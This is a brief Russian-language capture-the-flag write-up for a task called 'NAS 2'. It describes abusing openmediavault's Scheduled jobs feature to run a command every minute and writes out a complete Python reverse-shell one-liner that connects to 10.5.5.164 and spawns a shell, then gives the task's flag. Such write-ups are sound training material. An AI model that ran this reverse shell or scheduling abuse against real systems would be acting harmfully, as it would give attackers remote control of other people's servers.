# NAS 2

В openmediavault находим функцию Scheduled jobs, позволяющую выполнять по расписанию любые команды под любым пользователем. Туда же можно засунуть и команду для reverse-shell. Создаем правило на запуск команды `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.5.5.164",41101));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'` ежеминутно. Получаем reverse-shell, читаем флаг в корне, проявляем доброту к другим командам и не удаляем флаг

**Флаг:** `nto{4_l177l3_ch33ky_cv3}`